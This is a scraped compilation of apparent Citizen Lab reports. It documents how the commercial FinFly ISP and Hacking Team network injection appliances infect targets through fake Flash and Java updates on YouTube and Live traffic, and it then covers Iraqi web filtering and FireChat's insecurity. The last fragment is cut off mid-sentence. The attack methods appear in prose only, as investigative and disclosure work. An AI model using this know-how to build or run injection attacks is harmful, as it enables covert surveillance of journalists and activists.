Github\n\n\nLINE Region Code Encrypter Tool – A tool that enables users to change regions in the LINE client and disable regionally-based keyword censorship in the application\n\nAcknowledgements\nAdam Senft,  Jason Q.

    "text": "\n\t\t\t\tAuthor: Morgan Marquis-Boire\nDownload PDF version I Read on ISSUU \nRead Morgan Marquis-Boire’s op-ed in The Intercept on the report’s findings.\nRead the report’s accompanying piece in the Washington Post. This was published on the Washington Post’s front page [see PDF and PDF].\nThe report’s findings have also been covered by Washington Post’s The Switch blog, Schneier on Security, Heise Online [in German], The Verge, Tech Times, Techdirt, Gizmodo, Network World, Engadget, Marie Claire [in French], Slate [in French], Glamour [in French], and the Huffington Post.\n \n“… while Web 1.0 was invented so that theoretical physicists could publish research online, Web 2.0 was created so that people could publish cute photos of their cats.”\n— Ethan Zuckerman (2007)\n \n“Hidden in the dashboardThe unseen mechanized eyeUnder surveillanceThe road is full of cat’s eyes”\n\n— The Spy in the Cab, Bauhaus (1980)\n\n \nKey Findings\n\nCommercial network injection appliances are actively targeting Google’s YouTube and Microsoft’s Live services in order to install surveillance implants on targets across the globe.\nDocuments indicate that a prototype for targeted surveillance network injection appliances sold to the governments of Oman and Turkmenistan was designed by CloudShield Technologies, a US Department of Defense contractor.1\nThis report reveals never before seen documentation on the operation of Network Injection appliances from both Hacking Team and FinFisher and provides source code for an early prototype of FinFisher’s FinFly ISP product.\n\nIntroduction\nWhile there has been much discussion about the use of software described as ‘implants’ or ‘backdoors’ to perform targeted surveillance, this report is about the less well understood method by which most targeted surveillance is delivered: network injection. Taking advantage of security flaws in major web presences (such as Google’s ‘YouTube’ and Microsoft’s ‘Live’)2, vendors have started selling turnkey solutions that enable easy installation of targeted surveillance software at scale.\nThis report provides a detailed analysis of two products sold for facilitating targeted surveillance known as network injection appliances. These products allow for the easy deployment of targeted surveillance implants and are being sold by commercial vendors to countries around the world. Compromising a target becomes as simple as waiting for the user to view unencrypted content on the Internet.\nWhile the technology required to perform such attacks has been understood for some time, there is limited documentation of the operation of these attacks by state actors. This report provides details on the use of such surveillance solutions including how they are built, deployed, and operated.\nNetwork Injectors\nSoftware to perform man-in-the-middle attacks on networks has been available for some time. For example, in 2000, Dug Song released a suite of tools called ‘dsniff’ for capturing passwords on a switched network. Interestingly in 2001, Alberto Ornaghi and Marco Valleri, the founders of Milan based surveillance company Hacking Team, wrote a popular open source tool, ‘Ettercap’ which enabled active interception and manipulation of traffic on local area networks. In 2007, Francisco Amato released ‘EvilGrade’, a tool to intercept updates for popular applications and replace them with a malicious payload.\nIn recent years, this type of technology has not received much attention from the security community, as the technical aspects of these types of attacks, and solutions to to them, are well understood. If traffic is properly encrypted,3 it cannot be tampered with, and such attacks will fail. Additionally, performing this type of attack reliably at scale requires control of an Internet Service Provider (ISP) or Internet Exchange (IX) and the resources to purchase the hardware required to intercept and manipulate traffic at volume.\nOver the last few years, there has been an increase in the public awareness of state-sponsored hacking for the purposes of espionage and surveillance. Traffic interception and manipulation provide an obvious method for an attacker with resources and the power to enlist the cooperation of, or compel, network providers. It enables the installation of surveillance implants on target hosts without the need to resort to unreliable methods such as spear-phishing.\nIn many surveillance operations, physical access to target systems cannot be achieved and covert installation of a remote monitoring solution is required to be able to monitor a target. Network injectors provide a countrywide solution to this problem that can be integrated into an ISP’s access and / or core network to install the remote monitoring solution on selected target systems. Basically, this is the logical extension of a man-in-the-middle attack for an adversary that owns the wires in the ground or can coerce a service provider.\nNetwork injectors generally take the form of appliances based on carrier grade server technology. High-speed traffic interception allow attackers to identify victim traffic. Once this action has occurred, the traffic can be modified in a variety of ways. Early solutions infected executable files downloaded by the target or injected fake software updates for popular software.4 This document will describe how the most recent versions of these solutions infect targets on-the-fly by injecting malicious code into the traffic streams of popular websites.\nRecent Revelations\nDocuments leaked by Edward Snowden have revealed that the NSA uses man-in-the-middle network injection infrastructure to deliver malware implants for the purposes of targeted surveillance. One such system, known as QUANTUMINSERT, is illustrated below:\nFigure 1: Schematic of NSA’s QUANTUMINSERT system. (Source)\nAs described by Nicholas Weaver in Wired magazine:\n“All it takes is a single request from a victim passing a wiretap for exploitation to occur. Once the QUANTUM wiretap identifies the victim, it simply packet injects a 302 redirect to a FOXACID server. Now the victim’s browser starts talking to the FOXACID server, which quickly takes over the victim’s computer. The NSA calls this QUANTUMINSERT.”\nThe use of this system against European telecommunications provider Belgacom was documented last year.\nThe Intercept revealed that the NSA was using a system known as TURBINE to:\n“…increase the current capability to deploy and manage hundreds of Computer Network Exploitation (CNE) and Computer Network Attack (CNA) implants to potentially millions of implants.”\nEarlier reports based on the Snowden documents revealed that the NSA had compromised between 85,000 and 100,000 targets using such techniques.\nFor a longer discussion of Five Eyes capabilities in this area, see Claudio Guarnieri’s blog post, The Internet is Compromised.\nWhy use Network Injection?\nThe advantages of using such network injection techniques are obvious when compared to other common attack vectors such as spear-phishing or watering-hole attacks. These kinds of attacks rely on a target being tricked into opening a file or viewing malicious content, whereas, network injection allows the exploitation of any target that views any clear-text content on the Internet provided that they pass through a network point that the attacker controls. While major providers are making efforts to encrypt parts of their networks, a significant portion of the Internet’s traffic is still unencrypted, allowing for easy manipulation. Even pages that serve their own content securely are likely to use unencrypted traffic from a variety of advertising networks or other third parties.\nProvided that the attacker can persuade a sufficiently large carrier to install a network injection apparatus, they can be reasonably certain of the success of any attack. While an attacker would still need an exploit to escape from the context of the target’s browser, one of the browser plugins (such as flash, java, quicktime, etc.) or similar is likely to provide a low cost avenue for this. This type of capability obviates the need for spear-phishing or more clumsy attacks provided the target is in the attacker’s domain of influence.\nThis type of approach also allows for the ‘tasking’ of a specific target. Rather than performing a manual operation, a target can be entered into the system which will wait for them to browse to an appropriate website and then perform the required injection of malicious code into their traffic stream. As such, this could be described as ‘hacking on easy mode’.\nWhile the scope of the NSA’s system may have surprised many in the public, it has been generally assumed that the best funded spy agency in the world would possess advanced capability. What is perhaps more surprising is that this capability is being developed by Western vendors for sale on the commercial market.\nBackground on the ‘Lawful Intercept’ Market\nOver the last few years, a burgeoning commercial intrusion industry providing exploits and malware as lawful interception products has gained notoriety. In 2012, Jerry Lucas, the president of TeleStrategies, the company which runs the surveillance showcase ISS World (commonly known as the ‘Wiretapper’s Ball’) said in a New York Times article:\n“The market for such technologies has grown to $5 billion a year from nothing 10 years ago”\nWhile such products have traditionally been custom developed by a few nation states, the commercialization of this market has increased the ability of regimes to purchase advanced surveillance capabilities from vendors based in liberal democracies. Despite the fact that this technology is commonly sold as ‘lawful interception’, it has been used to target activists, journalists, dissidents, and human rights workers. Prior research by The Citizen Lab has tracked the usage of lawful intercept surveillance technology sold by FinFisher and Hacking Team against political and civil society targets including Bahrain Watch, Mamfakinch in Morocco, human rights activist Ahmed Mansoor in the UAE, and ESAT, a US-based news service focusing on Ethiopia.\nFinFisher, developed in Munich, is a line of remote intrusion and surveillance software marketed and allegedly sold exclusively to law enforcement and intelligence agencies. Until 2013, it was distributed by the UK based Gamma Group International. Hacking Team is a Milan-based company which, by their own account, sells commercial hacking software to law enforcement in “several dozen countries” on “six continents”. Citizen Lab has tracked the use of FinFisher to 25 different countries and Hacking Team to 22 different countries. These server location findings should not be considered to be a definitive list; in fact, Hacking Team is claimed to have been used in up to 60 countries worldwide.\nBoth FinFisher and Hacking Team sell network injection solutions, enabling easy compromise of targets on a country-wide basis. This ability in the hands of states that lack a robust rule of law raises concerns for high risk groups, as our work has shown.\nFinFly ISP\nIn 2011, Wikileaks began publishing “The Spy Files”, an archive of leaked brochures and other promotional material from commercial vendors of surveillance products. Among the documents were advertisements for a product called “FinFly ISP”.  Produced by Gamma International, this network injection product deploys remote monitoring agents on target systems with the assistance of an ISP. One of the use cases highlighted by the sales brochure was:\n“The customer deployed FinFly ISP within the main Internet Service Provider of their country. It was combined with FinFly Web to remotely infect Targets that visited government offensive websites by covertly injecting the FinFly Web code into the targeted websites.”\nA video advertisement for this product was uploaded to YouTube and can be found here.\nCitizen Lab was contacted by individuals involved in the design of an early version of this surveillance product. In addition to documentation on the operation of this appliance, Citizen Lab was also sent source code. We have no way to verify independently the authenticity of the material presented to us, but we are presenting it in this report for outside review.\nThese materials appear to indicate that a prototype of FinFly was created with the help of Sunnyvale, CA based company CloudShield Technologies (now a subsidiary of Leidos, previously Science Applications International Corporation (SAIC), a contractor to the US military and intelligence community).\nBelow you can see a screenshot of the prototype displaying the FinFly ISP solution running on CloudShield products. The solution is written in CloudShield’s custom language, RAVE.\nFigure 2: Screenshot of FinFly prototype running on CloudShield’s PacketWorks software\nA sample of the prototype FinFly ISP code can be found below:\n\nFigure 3: Sample of FinFly ISP source code\nBinary Mode is a flag to enable detection of a windows binary PE header on the wire, modify it in transit and inject loader + payload into the download ahead of the real binary. The real icon is preserved. Upon execution, the downloaded file would run the loader which executed the payload then cleaned the downloaded file on disk, such that it was the originally requested file. By this time, the payload would be memory resident. Finally, the real binary would be executed. This technique would work even with self-checking binaries. Update Mode is a flag to simulate reponses of update checks for iTunes, WinAmp, and other popular applications at the time. These responses were served from FinFly and spoofed applications into updating with infected versions.  It is possible to set both flags for a target. TrojanID is the payload to inject. FinFly could be loaded with several different trojans and a target dependent payload could be set. UTrojanID is the payload for update mode. These columns contain an ID which references the trojan from a simple RAM based filesystem created at load time with pre-built arrays. Compltd Count is the number of confirmed infections based on the fact that the target TCP/IP stack had acknowledged all the packets sent to it at the end of the session. Failed Count counted unsuccessful infection attempts based on lack of clean FIN flag exchange at the end of the session.\nSubsequent to this, a version was created with the help of the Swiss company Dream Lab Technologies AG. Documentation leaked by Wikileaks asserts that this system was deployed in Oman:\n“This offer is based upon a request of Thomas Fischer of Gamma International as well as on various conversations between Gamma International, Dreamlab Technologies AG and the end customer.“\nWikileaks documents also assert this to have been deployed in Turkmenistan.\nThe cost of this product for that bid is detailed below:\nFigure 4: Order form for the FinFly ISP installation in Turkmenistan\nThe above order form indicates a total cost of 874,819.70 Swiss Francs (CHF) or approximately 1 million US dollars. This includes a 43,200CHF fee for “On Site assembly in Turkmenistan”.\nA logical diagram of how the equipment is installed into a network and how the operation works:\nFigure 5: Diagram of FinFly installation.\nA network diagram of the infection proxy integration into an ISP environment can be found below:\nFigure 6: Diagram of FinFly integration into an ISP environment\nThe following slides describe the process of infecting targets:\nFigure 7: Gamma presentation slides describing FinFly target infection process\nThis shows how target selection occurs. In the administrative GUI, target information is entered (presumably a name). The subject’s IP address is then looked up in a RADIUS database and monitoring of the target’s traffic begins. The target’s traffic is analyzed for a stream suitable for injection. Once this stream is found, the traffic is modified and the malicious traffic injected.\nFigure 8: Gamma presentation slides describing FinFly target infection process.\nThe malicious traffic is checked to ensure that the modified traffic looks authentic and will be accepted by the target. Checksums are tested, TCP/IP packets are resequenced, and the modified and now malicious traffic is sent to the target.\nFigure 9: Gamma presentation slides describing FinFly target infection process\nOnce the target is infected, the surveillance operation can begin.\nHistorically, FinFly ISP was able to infect files that are downloaded by the target on-the-fly or infect the target by sending fake software updates for popular software.5\nThe latest promotional literature on the FinFly offering boasts:\n“The new release now integrates Gamma’s powerful remote infection application FinFly Web to infect Targets on-the-fly by just visiting any website.”\nFinFly Web appears to be the component of the FinFly architecture that infects any clear-text page in order to offer malware as a download. It appears that a recent (unrelated) leak6 has made the FinFly Web component of the FinFly architecture available on Github.\nThis appears to be a screenshot of this being used live in Bahrain:7\nFigure 10: Screenshot of FinFly Web product being used in Bahrain\nThis seems to show the use of FinFly Web to offer visitors to the website a fake flash update in order to facilitate the installation of malware. Presumably, the operators either did not pay for, or did not decide to use the FinFly Exploit Portal which would have allowed silent installation of a backdoor as per the example in the product description:\n“A Target was identified within a Discussion Board but no direct or Email contact was possible. The Agency created a Webserver containing an Internet Explorer 0-day Exploit which deployed the Payload on the Target System once the Target opened the URL that was sent to him through a private message in the Discussion Board.”\nThe same recent document releases include an internal “FAQ” document, apparently for FinFisher salespeople,  that may indicate an association with the well known exploit vendor VUPEN, although this cannot be independently verified :\n“Q: Can you supply a list of the current exploits?\nA: Yes but we need to do this individually for each request as the available exploits change on a regular basis.\nQ: Can we name the supplier?\nA: Yes you can mention that we work with VUPEN here”\nThe feature overview for FinFly Exploit portal claims:\n\nHacking Team\nThe Milan-based “Hacking Team S.R.L.” provides similar services to the FinFisher suite sold by Gamma Group. On Hacking Team’s website they state:\n“…we provide effective, easy-to-use offensive technology to the worldwide law enforcement and intelligence communities.”\nTheir primary offering is surveillance malware for OSX, Windows, Linux, iOS, Android, BlackBerry, and Windows Mobile. As a delivery mechanism for this malware, they sell a network injection appliance designed to be deployed in an ISP in a similar manner to FinFly ISP.\nIn Hacking Team’s documentation, they define their Network Injector as a:\n“Hardware component that monitors the target’s network traffic and injects an agent into selected Web resources. It comes in two versions, Appliance or Tactical: the former is for deployment at the ISP, the latter for use on the field.”\nFigure 11: Hacking Team’s RCS 9 Technician Guide\nThey stipulate:\n“Resources that can be infected by RCS are any type of files. NOTE: Network Injector is not able to monitor FTP or HTTPS connections.”8\nIn addition to network injection, Hacking Team’s offering provides:\n\nWifi password cracking\nThe ability to fake wifi Access Points\nTraffic monitoring for compromised networks\nInjection in non-ISP environments (ie hotels)\n\nThis functionality would not create the paper trail of an ISP-based deployment. As with IMSI catchers and similar tools, this raises important questions about whether jurisdictions where it is deployed have the proper structures for judicial oversight. As it is portable, and doesn’t require the cooperation of an ISP, it could conceivably also be used for foreign hostile intelligence gathering.\nHacking Team has filed for patents on a “Method and Device for Network Traffic Manipulation” as can be seen below:\nFigure 12: Hacking Team’s patent application for “Method and Device for Network Traffic Manipulation”. (Source)\nFigure 13: Hacking Team’s patent application for “Method and Device for Network Traffic Manipulation”. (Source)\nThe patent filing provides a breakdown on the design of the network injection appliance:\nFigure 14: Hacking Team’s patent application for “Method and Device for Network Traffic Manipulation”. (Source)\n \nExploitation of Google and Microsoft\nAs described in the Citizen Lab report Police Story: Hacking Team’s Government Surveillance Malware, material was provided to the Citizen Lab which appears to document the operation of several Hacking Team products. As stated previously, we have no knowledge as to the origin of the documents, and whoever sent them took steps to conceal their identity.  While the authenticity of these documents is unverified, we have not identified inconsistencies with what is currently known about Hacking Team RCS.\nThe Hacking Team Network Injector monitors all HTTP connections and, following the injection rules, identifies the target’s connections and injects the agent into the connections, linking it to the resources the target is downloading from the Internet.\nBelow is a screenshot from Hacking Team’s network injection appliance.\nFigure 15: Image Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, System Administrator’s Guide,” 2013\nNetwork Injectors allow for automatic identification of target devices and infect them according to the rules set via their control software. As shown above, the appliance exploits YouTube users by injecting malicious HTML-FLASH into the video stream. From the description of the rule targets below, this appears to be a custom payload designed for YouTube.\nFigure 16: Image Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, System Administrator’s Guide,” 2013\nWhile this infection method requires user interaction to accept the fake Flash update, it is also possible to bundle the payload with an exploit in order to silently install the surveillance agent.\nTo provide an example of how a deployment of a tactical surveillance implant would work using a system like this, we refer you to the illustration below (click to enlarge):\nFigure 17: A diagram explaining the exploitation of YouTube Users [Illustration by Willow Brugh]In this diagram, the user (watching a cute cat video) is represented by the laptop, and YouTube is represented by the server farm full of digital cats. You can observe our attacker using a network injection appliance and subverting the beloved pastime of watching cute animal videos on YouTube.\nA step-by-step breakdown of how such an attack might occur is as follows:\n\nA target is selected and their name is entered into the Network Injection GUI.\nThe target’s traffic stream is located based on their ISP’s RADIUS records.\nAs per the rule on the network injector (as shown in Figure 14), the appliance waits for the target to visit YouTube.\nWhen this traffic is identified, it is redirected to the network injection appliance.\nThe legitimate video is blocked and malicious flash (SWF) is injected into the clear-text portion of the traffic. (Represented by the kitty skull and cross bones.)\nThe target is presented with a dialogue to upgrade their flash installation. If this upgrade is accepted the malicious SWF enables the installation of a ‘scout agent’ which provides target validation.\nIf the target is assessed as correct (i.e., the desired person), and safe for install (not a malware analysis honeypot), then the full agent is deployed.\nSurveillance of the target commences.\n\nFigure 18: Google issue tracker for unencrypted YouTube streaming. Marked as “WontFix”\nAfter being alerted by the author of this post to the sale of devices to exploit YouTube users, a representative at Google stated on July 22nd, 2014 that they were accelerating two changes. All users using an extension like HTTPS Everywhere will now receive the full page and video stream over TLS. Additionally, a roll-out of full-TLS YouTube is being carried out for all users, independent of login state.\nMicrosoft Clear-Text Login\nWindows Live presents another attack surface used by Hacking Team’s network injection appliance. Unlike some other free webmail providers, some elements of the login page are provided to the user in clear-text, making them observable to a network adversary and consequently easy to tamper with.\nAs shown in Figure 14 above, a network injection rule exists for the login service for Microsoft’s live.com website. When a target loads the login.live.com website, the INJECT-HTML-JAVA payload is deployed. This payload alerts the user of an update to java and installs the RCS agent. It is additionally possible to use an exploit for silent installation.\nFigure 19: Login page for Microsoft’s Live service being served over HTTP\nAs discussed previously, this type of injection can occur since it is possible to load this page over HTTP.\nWe alerted Microsoft to this issue and on August 6th, they pushed out a hotfix to automatically force all users to use https://login.live.com.\nMitigation and Prevention Measures\nClear-text is dead\nThus far we have provided two examples of commercial tools that have widely proliferated and that enable purchasers (for a fee) to exploit clear-text traffic in some of the most popular sites on the web.\nIn order for network injection appliances to function, they rely on the fact that popular websites will not encrypt all of their traffic. In order to mitigate these types of attacks, we suggest that providers serve all content over TLS, and provide end-to-end encryption wherever possible. The use of HSTS and certificate pinning is also strongly recommended.\nHistorically, it has been considered expensive to run cryptography for major services. This has helped delay the widespread adoption of encryption especially for websites that provide a free service to a large number of users. This is no longer the justification that it once was. In a recent presentation at IETF 90 on HTTP/2, Google’s Adam Langley said: “Clear-text is no longer reasonable.”\nFor the average user, no complete solutions to this problem currently exist. The Electronic Frontier Foundation’s HTTPS Everywhere has been a good start toward allowing users to request that companies serve them data in an encrypted manner. Even while using this plugin, however, data can still be delivered to the user without HTTPS, including sites where some data is encrypted. There is a plugin currently available, HTTP Nowhere, which claims to allow only encrypted traffic; however, as currently implemented, it might break the functionality of popular websites. Enabling this feature is an entertaining illustration of how much the user experience of web browsing is still dependent on unencrypted data.\nAs always, it would be wise to avoid downloading programs from sites that do not use HTTPS and be extremely cautious about sites that prompt you to unexpectedly install software.\nConclusion\nThe proliferation of tools for both tactical and on network injection attacks highlights a vulnerability that has existed since the beginning of the consumer Internet. Until recently, however, it has been challenging to gauge the practical viability of this attack and the number of actors that might have this capability. Hacking Team and FinFisher are probably not unique in packaging and selling these techniques. In terms of surveillance vendors that provide such technology, it seems likely that this is but glimpse into a larger market.\nCurrently, those residing in or traveling to countries where we and others have identified the presence of these tools have few options for protecting themselves beyond the use of private networks such as VPNs.\nThis report is not the first to highlight the problem. It is, however, no longer the case that cryptography is so resource intensive that this problem cannot be solved. What is required is a recognition on the part of content and service providers that this falls within the scope of their responsibility to provide secure service to their users. In response to this research, Google and Microsoft have already made statements indicating they are working on the problem. We hope that other providers will take their cues from this and undertake similar measures.\nAcknowledgements\nI would like to thank my colleagues at Citizen Lab for their invaluable assistance with this report.

    "text": "\n\t\t\t\tDownload PDF version  I Read on ISSUU\nRead media coverage of the report in the Mashable and Threatpost.\nRead the Arabic Version  / النسخة العربية  translated by Cyber Arabs\nKey Findings\n\nSince our last report, our test results have shown that prominent pan-Arab news sites and a local news portal critical of the central government have been added to the list of filtered content. In addition, test results show that filtering of prominent social network sites was also briefly removed, then restored, on three of the ISPs tested.\n\n\nWebsites affiliated with or supportive of ISIS and other militant groups remain largely accessible.\n\n\nMobile messaging app FireChat, which has grown in popularity in Iraq since the Internet shutdown and increase in filtering, is highly insecure for sensitive communications. The application transmits messages and stores sensitive user information on the device without encryption, anyone can easily display recent messages on the service, and it is relatively easy to impersonate another user without authorization.\n\n\nOur investigation shows that ISIS-affiliated Android application Dawn of Glad Tidings, which has been reported to use consenting user’s Twitter feeds to spread ISIS-related information, is a relatively simple app built using a web tool which aggregates ISIS-related RSS/Atom feeds.\n\nIntroduction\nIn June 2014, we published a report documenting the results of our network measurement tests that found evidence of 20 URLs that were blocked in Iraq following the ongoing conflict with the jihadist group, the Islamic State in Iraq and Greater Syria (ISIS). Our results showed that a number of prominent websites, including Facebook, Twitter, Skype and YouTube, were blocked on three ISPs tested. These tests results followed earlier reports of filtering in Iraq and of certain regions of the country which had been entirely disconnected from the Internet. The same research also found that websites affiliated with or supportive of ISIS and other militant groups in Iraq were accessible from Iraq.\nSince the publication of that report, we have continued to conduct network measurement tests to identify instances of Internet filtering of websites representative of local, regional and international media, local oppositional portals, and websites containing Jihadi materials or supportive of ISIS and other militant groups in Iraq.\nIn addition to these tests, we have examined two mobile applications that have received significant attention in coverage of the Iraq insurgency. The first, FireChat, is a U.S.-developed mobile messaging platform that facilitates off-the-grid messaging; features which make it ideal in situations where Internet access is restricted, and that has resulted in growing user numbers in Iraq. However, it is crucial that as applications such as FireChat become more popular in dangerous environments like Iraq, that users are informed about the security features and limitations of using such tools. The second application, Dawn of Glad Tidings, is an Android app developed by ISIS that has been reported to broadcast messages using the Twitter accounts of users who install the application.\nThis post contains three parts.\n\nPart 1 describes the results of our network measurement tests, which have shown the addition of six URLs to the existing list of 20 blocked URLs, as well as significant fluctuations in the list of websites filtered since June.\n\n\nPart 2 is an examination of the FireChat application that shows it does not encrypt the communications or stored data on the device, and permits user accounts to be easily impersonated, a feature that can be exploited by security agencies and rival groups to trap and reveal information about their opponents.\n\n\nPart 3 is our analysis of the Dawn of Glad Tidings app that shows contrary to some reports, it is a relatively simple application that aggregates several pre-existing data streams (including YouTube videos, as well as Tumblr and WordPress posts) of ISIS-related information.\n\n\nPart 1: Internet filtering\nMethodology\nWe used two methods to determine if and how Internet filtering is being applied in Iraq:\n\nThe first method performs remote lookups of DNS records to identify suspicious results that could be indicative of filtering.\nThe second method undertakes remote testing of website accessibility through proxies. We wrote a script that performs a GET request of a list of websites through publicly accessible proxies located in Iraq. We then compare the results of these GET requests with attempts to access the same URLs from the University of Toronto network to identify instances of blocking.\n\nEarly reports from Iraq suggested that blocking was performed on some ISPs through DNS tampering. DNS converts domain names (such as “citizenlab.org”) to an IP address (74.208.36.253). If the information in DNS records is tampered with, domain names can resolve to an incorrect IP address, which can lead visitors to a blockpage. In some cases, it is possible to perform lookups of the DNS records used by Iraq-based ISPs remotely, without being connected to that ISP directly. After performing these DNS lookups, we are able to compare the results for a given domain name with what we would expect to see to identify aberrations.\nWe performed a lookup of a list we compiled of 1,392 URLs to identify suspicious DNS results. We also did GET requests for these URLs on this list on the publicly accessible proxies we found in Iraq. This list contains content ranging from international news websites, social media platforms, and content specific to Iraq’s domestic political, social and cultural context. A full list of URLs tested can be found in the Data section at the end of this post.\nResults\nFollowing the publication of our June 2014 report, we have continued to test for website accessibility using proxy servers and testing of DNS nameservers. This testing has documented three notable changes in blocking behaviour since June 2014.\nFirst, on June 20 the websites of Saudi Arabia-based television news channel Al-Arabiya (alarabiya.net) and Qatar-based television channel Al-Jazeera (aljazeera.net and aljazeera.com), were blocked by all three ISPs tested. On July 18, Al Arabiya News Channel condemned the blocking of its website in Iraq saying that Iraqi prime minister Nouri al-Maliki is trying to restrict media freedom and the flow of information from Iraqi citizens amid “the government’s successive failures to maintain stability in the country.”\nOn July 2, filtering of all websites tested (with the exception of Al Arabiya and Al Jazeera) appeared to be removed. This change was noted elsewhere although there was no apparent explanation for the change.\nFinally, on July 7, filtering of social networking services and other websites resumed, where it has remained until our last tests on July 21. Reports suggested this change was made due to the fact that “the war with ISIS is now [a] media war and the government wants to control those sites to prevent rumours being broadcasted.” Local media quoted Iraqi telecom officials as saying that websites of 20 local, regional and international news organizations have been permanently blocked in Iraq as per orders from security officials because the institutions support terrorism. The officials said while the ban on social media is temporary, the blocking of the news websites is permanent. A  telecom official later stated that the ban on social media would be lifted for the Eid holiday during the last week in July to allow citizens to communicate, although this official stated it was uncertain if the lifting of filtering would be permanent.\nOur most recent round of testing identified a total of six new URLs which we had not identified as filtered in our June 2014 report, consisting of two news outlets — Al-Arabiya and Al-Jazeera — and four websites (herakiq.com, iraqislami.own0.com, muslm.org and hanein.info).\nThe website Herak Iraq, which means “Iraq [political] movement,” reported on June 24, that its website was blocked in Iraq. The website is political and it reports on what it calls the Iraqi Shiite government oppression of Sunni citizens and the counter-Shiite mobilization in Sunni regions. The website “iraqislami.own0.com” is a forum that has been shut down by the hosting service provider, citing violation of its terms and conditions. The domain, which currently only contains a notification of the shutdown, is still blocked. An archived version of the site from June 25 shows that it was a discussion forum apparently run by ISIS. It included information about its operations, reports, and information products promoting its ideology and actions. The site “muslm.org” is an Arabic Islam-oriented news and views portal with no obvious militant content. Finally, “hanein.info” is a discussion forum with mostly militant topics that are critical of the central government in Iraq for being sectarian.\nWe summarize the changes to the list of blocked websites, per ISP, below:\nScopeSky\nTests of domain name resolution were conducted on the ISP ScopeSky using the nameservers ns1.itc.iq (185.23.153.242) and ns2.itc.iq (185.23.153.243). 19 unique URLs resolved to either 127.0.0.1 (or ‘localhost’, which refers to the IP address of the user’s computer itself) or 185.23.154.26/185.23.153.235, IP addresses on ScopeSky’s network which lead to the following blockpage:\nFigure 1: Blockpage seen on the ISP ScopeSky\n \nThe instances where a tested URL resolved to one of these incorrect IP addresses are indicated in the following table (click image to enlarge):\n\nProxy testing conducted on this ISP on July 4, 2014 confirmed that this blockpage was displayed when attempting to access “aljazeera.net.” However, this proxy testing also noted some inconsistencies in filtering on ScopeSky. While “aljazeera.net” was blocked, “www.aljazeera.net” was accessible.\nEarthLink\nTests of domain name resolution were conducted on the ISP EarthLink using the nameserver “ns1.earthlinktele.com” (109.224.14.2) from June 23 to July 21, 2014. During these tests, 19 total URLs resolved to the IP address 192.168.222.66, a non-publicly routable IP address that on Earthlink led to the following blockpage:\nFigure 2: Blockpage seen on EarthLink\nThe URLs that resolved to this address changed frequently. The instances where a tested URL resolved to this incorrect IP address are indicated in the following table (click image to enlarge):\n\nWe conducted proxy testing on four proxies on EarthLink on July 4, 16 and 17, 2014. This testing found some inconsistencies in blocked websites between proxies, and in some cases, it was not possible to confirm the status of a given URL. The following URLs were confirmed blocked, with the blockpage seen above, on these days:\n[insert earthlink table]\nSimilar to results seen on ScopeSky, proxy testing also confirmed inconsistencies in how filtering is applied. In one example, attempts to access “hanein.info” delivered a blockpage, while attempts to access “www.hanein.info” lead to a redirect to “www.google.com.”\nIQNET\nWe conducted tests of domain name resolution on the ISP IQNet using the nameservers “nserver1.iqnet.com” (62.201.215.1), “nserver2.iqnet.com” (62.201.215.2), “nserver3.iqnet.com” (62.201.201.201) and “nserver4.iqnet.com” (62.201.201.202). During the testing period, “nserver1.iqnet.com” and “nserver2.iqnet.com” did not allow recursive queries and as a result did not display any abberant results. However, “nserver3.iqnet.com” and “nserver4.iqnet.com” did display abberant results, with a total of 13 unique domains resolving to the non-publicly routable IP address of 192.168.168.168 or displaying that nameserver as the Start of Authority (SOA) for a given domain. Both of these results are indicative of intentional filtering.\nThe following domains resolved to an incorrect IP address during the testing period (click image to enlarge):\n\nTarinnet\nWe conducted proxy testing on the ISP Tarinnet on July 11, 2014. There was no evidence of any filtering on this Kurdistan-based ISP.\nThe lack of uniform Internet policy in Iraq and Iraq’s Kurdistan reflects the political division between the central government and the autonomous Kurdistan region. Commenting on a previous dispute over federal Internet regulations, Karwan Sheikh Raza, head of Kurdistan’s post and communications department, said a decision from the central government does not apply to Kurdistan. Renesys has noted recently that Kurdistan ISPs are increasingly providing transit for Iraq’s international Internet connectivity outside the country.  The division between the central government and the Kurdistan region on Internet regulation is likely fueled by Kurdistani efforts to seek independence from Iraq. The president of Kurdistan region asked the region’s parliament in July 2014 to start preparing for a referendum on the region’s right of self-determination.\n\nPart 2: FireChat\nSince the increase in website filtering and complete shutdown of the Internet in some regions,  the mobile messaging platform FireChat has garnered attention for its growth amongst Iraqi Internet users. Reports have suggested that the application has been downloaded 40,000 times in the country since June 14, making Iraq the second biggest user of the application after the United States. Additional reports have indicated that some 7,000 new chat rooms have been created in Iraq within a few days in June 2014, almost 10 percent of the total rooms created globally since the application launched in March 2014.\nFigure 3: Increase in users of FireChat in Iraq. [Source: Bloomberg]\nThe FireChat app purports to be a tool for chatting “off-the-grid”, allowing users to message anyone nearby, even without a mobile or wireless Internet connection. It does this through a device’s Bluetooth functionality or Apple’s Multipeer Connectivity framework (on iPhone devices) to permit users to continue to chat off-the-grid with users up to 200 feet away. The application’s Google Play store listing describes “live and anonymous discussions” with “no Facebook or email login, no password to remember”.\nThe initial reports about the growing popularity of FireChat described the benefits it could offer users in this restricted environment. Christophe Daligault, vice-president of sales and marketing at Open Garden, developer of FireChat said, “There are enough users of FireChat in Baghdad now to create many local ‘intranets’. Even if no device in this local network has access to the internet, people can still exchange messages’. However by June 25, 2014, FireChat’s developers acknowledged the potential security risks of using the application for sensitive communications:\n“People need to understand that this is not a tool to communicate anything that would put them in a harmful situation if it were to be discovered by somebody who’s hostile,” he said. “It was not meant for secure or private communications.”\nTools to facilitate communications during a conflict, particularly when a growing number of popular platforms remain filtered and in some regions the Internet is shut down entirely, are of crucial importance. In such an unstable environment, users may look to new tools and methods that allow them to communicate with each other, and to document and share the events occurring inside Iraq to the outside world. However, such tools can be a double-edged sword. Insecure tools can expose the sensitive communications of users and leave unencrypted data present on a user’s device. As a result, it is crucial for users of such tools to understand any potential security features and limitations. We describe some of these features and limitations in more detail below.\nAnalysis\nWe tested version 2.5.1 of FireChat, which was last updated on June 20, 2014. We downloaded the application from the Google Play Store on July 10, 2014. The MD5 checksum of the APK file is: 5e928f558b8fda6d92f4b54218f1335c. We tested the application on an Android phone and used Wireshark to perform packet captures on the traffic sent and received by the application.  In order to explain behaviours observed in packet captures, we also decompiled the apk with jd-gui, to explain how messages are generated.\nThe FireChat application consists of three messaging modes: “Everyone”, “Nearby” and “FireChats”. “Everyone” is a semi-global chatroom where up to 80 individuals are sorted broadly based on their geographic location. “Nearby” is the function of the application that pairs users who are in close geographic proximity to each other using Wi-Fi, Bluetooth, 